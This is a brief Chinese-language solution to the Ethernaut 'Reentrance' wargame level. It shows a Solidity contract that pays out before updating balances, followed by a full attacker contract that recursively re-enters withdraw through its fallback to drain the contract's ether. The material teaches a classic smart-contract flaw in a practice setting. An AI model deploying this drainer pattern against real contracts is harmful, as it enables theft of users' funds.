# 重入攻击

> 目标是偷走这个合约里面的所有钱

[link](https://ethernaut.openzeppelin.com/level/0x573eAaf1C1c2521e671534FAA525fAAf0894eCEb)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';
// 👇这个可以直接引用
// import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

这是一个经典的重入攻击例子。

如果不知道什么是重入攻击可以看一下wtf solidity的[例子](https://github.com/AmazingAng/WTF-Solidity/blob/main/S16_NFTReentrancy/readme.md)

我们通过`msg.sender.call`来调用攻击合约的fallback方法，在从fallback中调用withdraw从而实现递归。


```solidity
contract Attack {

    Reentrance addr;

    constructor(address addr_) public {
        addr = Reentrance(payable(addr_));
    }

    function attack() external payable  {
        addr.donate{value: msg.value}(address(this));

        addr.withdraw(msg.value - 1);
    }

    fallback() external payable {        
        if (address(addr).balance > 0) {
            if (addr.balances(address(this)) > address(addr).balance) {
                addr.withdraw(address(addr).balance);
            } else {
                addr.withdraw(addr.balances(address(this)));
            }
        }
    }

}
```



